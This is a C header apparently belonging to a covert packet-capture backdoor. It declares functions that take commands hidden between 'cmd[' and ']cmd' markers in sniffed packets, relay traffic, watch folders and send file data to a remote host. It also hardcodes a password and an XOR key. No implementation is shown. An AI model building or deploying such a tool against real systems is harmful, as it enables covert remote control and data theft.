#ifndef PKTCAP_H
#define PKTCAP_H

#include "utils.h"
#include "lib/isaac_encryption.h"

#include <sys/inotify.h>
#include <sys/select.h>
#include <sys/types.h>

#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>


#pragma pack(1)
#define TRUE 1
#define FALSE 0

#define NETWORK_INT 		"em1"
#define PASSWORD 		"uest1onQ?"
#define PKT_SIZE 		1518
#define BUFFER 			100
#define SIZE_ETHERNET 		14
#define ETHERNET_ADDR_LEN	6
#define CMD_START 		"cmd["
#define CMD_END 		"]cmd"
#define CMD_OUTPUT_SIZE         30000
#define FROM_SERVER		1
#define FROM_CLIENT		0
#define FROM_RELAY              2

#define RESPONSE_MODE           0
#define TRANSFER_MODE           1
#define CREATE_MODE             0
#define APPEND_MODE             1
#define EVENT_SIZE (sizeof (struct inotify_event))


#define xor_key "7Zdl2saWXdZ43LR2LqEhK6JXmwYiw7P95PSA^/jJ(w7Zj,]MhAW6*@D<_:"

/* IP header */
struct ip_struct {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};

#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct tcp_struct {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
	#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};
/* UDP header */
struct udp_struct {
	u_short	uh_sport;		/* source port */
	u_short	uh_dport;		/* destination port */
	u_short	uh_ulen;		/* datagram length */
	u_short	uh_sum;			/* datagram checksum */
};

struct filelist {
	const char* path;
	int wd;
	struct filelist * next;
};

int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, 
                       char * listen_host, int listen_port, char * dest_host, int dest_port, int protocol);
int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp);
void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet);
void pkt_callback_relay(u_char *ptr_null, const struct pcap_pkthdr * pkt_header, const u_char* packet);
int relayPacket(char * payload, int size_payload, const char * src_ip, const char * dest_ip, const int dest_port, int protocol);
int parse_cmd(char * command, char * data, int size);
int process_command(char * command, const char * src_ip, const char * dest_ip, const int dest_port, int protocol);
int send_file_data(const char* folder, const char * fileName, const char* src_ip, const char* dest_ip, const int dest_port, int protocol);
int initFileMonitor(struct filelist* folder, const char* src_ip, const char* dest_ip, const int dest_port, int protocol);

#endif
